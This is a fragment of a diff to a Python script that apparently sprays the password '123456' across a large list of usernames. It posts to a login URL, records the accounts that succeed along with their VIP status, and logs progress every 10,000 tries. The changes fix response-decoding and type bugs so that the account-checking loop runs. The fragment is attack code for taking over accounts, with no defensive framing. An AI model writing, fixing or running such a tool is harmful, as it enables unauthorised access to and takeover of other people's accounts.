@@ -15,13 +15,13 @@ if __name__ == "__main__":
             status = int(json.loads(res)['status'])
             if status == 1:
                 res = requests.post(login_url.format(u))
-                vip = json.loads(res)['vip']
+                vip = json.loads(res.content.decode())['vip']
                 file.write(u + " " + "123456 " + str(vip) + " \n")
                 file.flush()
             elif status == -2:
                 file.write(u + "\n" )
                 file.flush()
             if counter % 10000 == 0:
-                record.write(counter)
+                record.write(str(counter))
                 record.flush()
 
